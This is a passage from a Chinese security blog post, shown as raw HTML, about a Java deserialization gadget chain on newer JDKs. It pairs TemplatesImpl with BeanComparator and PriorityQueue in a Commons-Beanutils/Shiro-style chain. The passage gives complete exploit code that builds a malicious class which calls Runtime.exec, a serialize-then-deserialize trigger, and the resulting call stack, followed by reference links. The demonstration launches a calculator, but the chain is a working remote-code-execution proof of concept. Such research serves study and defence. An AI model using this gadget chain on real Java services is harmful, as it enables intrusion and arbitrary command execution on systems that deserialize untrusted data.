+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>evilClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>insertAfter</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>evilBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>stubClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;Stub&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>stubBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stubClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>evilBytes</span><span class=p>,</span><span class=w> </span><span class=n>stubBytes</span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnd&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_transletIndex&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>BeanComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BeanComparator</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>CASE_INSENSITIVE_ORDER</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>comparator</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;1&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;1&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>comparator</span><span class=p>,</span><span class=w> </span><span class=s>&#34;property&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;outputProperties&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=w> </span><span class=s>&#34;queue&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=n>templates</span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>barr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>barr</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>queue</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>barr</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>(),</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Field</span><span class=w> </span><span class=nf>getField</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>clazz</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchFieldException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/high-jdk-reflection-templatesimpl/7.png width=2440 height=1274 loading=lazy alt=img></p><p>调用栈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xalan</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>xsltc</span><span class=p>.</span><span class=na>trax</span><span class=p>.</span><span class=na>TemplatesImpl</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>267</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>497</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectStreamClass</span><span class=p>.</span><span class=na>invokeReadObject</span><span class=p>(</span><span class=n>ObjectStreamClass</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1058</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readSerialData</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1900</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readOrdinaryObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1801</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject0</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1351</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>371</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>PriorityQueue</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>791</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>497</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectStreamClass</span><span class=p>.</span><span class=na>invokeReadObject</span><span class=p>(</span><span class=n>ObjectStreamClass</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1058</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readSerialData</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1900</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readOrdinaryObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1801</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject0</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1351</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>371</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>shiro</span><span class=p>.</span><span class=na>CB</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>CB</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>48</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>当然了，我们也可以用 spring 原生反序列化来演示下高版本，看下篇文章</p><blockquote><p><a class=link href=https://forum.butian.net/share/3748 target=_blank rel=noopener>https://forum.butian.net/share/3748</a></p><p><a class=link href=https://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/ target=_blank rel=noopener>https://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+</span><span>参考阅读</span></div><ol class=article-references__list><li><a href=https://forum.butian.net/share/3748 target=_blank rel=noopener>https://forum.butian.net/share/3748</a></li><li><a href=https://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/ target=_blank rel=noopener>https://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/</a></li></ol></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
